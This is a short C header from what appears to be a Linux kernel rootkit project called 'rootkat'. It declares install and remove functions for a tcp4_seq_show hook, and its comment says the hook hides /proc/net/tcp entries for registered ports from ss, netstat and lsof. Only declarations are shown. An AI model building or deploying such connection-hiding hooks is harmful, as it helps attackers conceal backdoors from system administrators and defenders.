/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_TCP4_SEQ_SHOW_H
#define ROOTKAT_HOOK_TCP4_SEQ_SHOW_H

/*
 * tcp4_seq_show hook — filters /proc/net/tcp entries whose local port
 * is in the hidden-ports registry. Affects ss/netstat/lsof. IPv6
 * (tcp6_seq_show) and UDP are deliberately out of scope for v1.
 */
int rootkat_hook_tcp4_seq_show_install(void);
void rootkat_hook_tcp4_seq_show_remove(void);

#endif
